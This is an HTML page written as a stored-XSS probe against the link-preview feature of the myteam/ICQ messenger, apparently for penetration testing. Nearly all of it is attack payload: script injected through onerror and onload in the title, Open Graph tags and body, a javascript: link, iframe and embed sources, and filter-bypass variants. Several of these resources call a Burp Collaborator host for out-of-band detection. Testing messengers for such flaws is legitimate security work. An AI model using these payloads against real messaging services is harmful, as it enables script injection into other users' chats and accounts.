<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<!-- Preview-XSS test payload for myteam/ICQ snippet preview.
     Target sanitizer controls TECH.P.2.Web.Snippet.1-4:
       .1 no tags without text/images  -> surround with text
       .2 remove hidden elements       -> use display:block
       .3 remove nesting               -> flat tags
       .4 whitelist embeds             -> try iframe/embed
     Replace ucammfue8t9jvdi3rupy37aef5lw9rxg.oastify.com with your Burp Collaborator / webhook host for OOB detection.
     Share THIS page's URL in a myteam/ICQ chat and open the chat.
     If any vector fires (alert or OOB hit) => stored XSS in corporate messenger via preview.
-->
<title>myteam-xss-title-test <img src=x onerror=alert('xss-title')> end</title>
<meta property="og:title" content="myteam-xss-ogtitle <img src=x onerror=alert('xss-ogtitle')> end">
<meta property="og:description" content="desc <img src=x onerror=alert('xss-desc')> end">
<meta property="og:image" content="https://ucammfue8t9jvdi3rupy37aef5lw9rxg.oastify.com/og-img-title.png">
<meta property="og:url" content="https://ucammfue8t9jvdi3rupy37aef5lw9rxg.oastify.com/og-url">
</head>
<body>
<h1>Preview XSS test</h1>
<!-- additional vectors the client may render from body/snippet -->
<a href="javascript:alert('xss-a')">javascript-link</a>
<svg onload="alert('xss-svg')"></svg>
<img src="https://ucammfue8t9jvdi3rupy37aef5lw9rxg.oastify.com/img-load.png" onerror="alert('xss-img')">
<iframe src="https://ucammfue8t9jvdi3rupy37aef5lw9rxg.oastify.com/iframe"></iframe>
<embed src="https://ucammfue8t9jvdi3rupy37aef5lw9rxg.oastify.com/embed">
<!-- nesting bypass attempt -->
<div><span><img src=x onerror=alert('xss-nested')></span></div>
<!-- hidden-element bypass attempt (sanitizer removes display:none) -->
<div style="display:block"><img src=x onerror=alert('xss-display')></div>
</body>
</html>
